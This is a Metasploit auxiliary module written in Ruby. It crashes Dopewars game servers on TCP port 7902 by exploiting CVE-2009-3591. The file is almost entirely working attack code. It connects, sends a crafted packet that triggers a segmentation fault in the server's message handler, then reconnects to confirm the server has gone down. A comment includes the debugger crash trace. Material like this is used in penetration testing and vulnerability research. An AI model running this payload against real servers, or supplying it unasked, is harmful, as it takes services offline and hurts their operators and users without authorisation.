# Dopewars DOS attack.

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Dopewars Denial of Service',
			'Description'    => %q{
				This module sends a specially-crafted packet to a Dopewars 
				server, causing a SEGFAULT.
			},
			'Author'         => [ 'dougsko' ],
			'License'        => GPL_LICENSE,
			'Version'        => '0.1.0',
			'References'     =>
				[
					[ 'URL', 'None' ],
					[ 'BID', 'None' ],
					[ 'CVE', 'CVE-2009-3591' ],
				]))
			
			register_options([Opt::RPORT(7902),], self.class)
	end

	def run
		connect

        # jet command
        # Program received signal SIGSEGV, Segmentation fault.
        # [Switching to Thread 0xb74916c0 (LWP 30638)]
        # 0x08062f6e in HandleServerMessage (buf=0x8098828 "", Play=0x809a000) at
        # serverside.c:525
        # 525           dopelog(4, LF_SERVER, "%s jets to %s",

		pkt =  "foo^^Ar1111111\n^^Acfoo\n^AV65536\n"
		print_status("Sending dos packet...")
		sock.put(pkt)
		disconnect

        print_status("Checking for success...")
        sleep 2
        begin
            connect
        rescue ::Interrupt
            raise $!
        rescue ::Rex::ConnectionRefused
            print_status("Dopewars server succesfully shut down!")
        end
	end

end
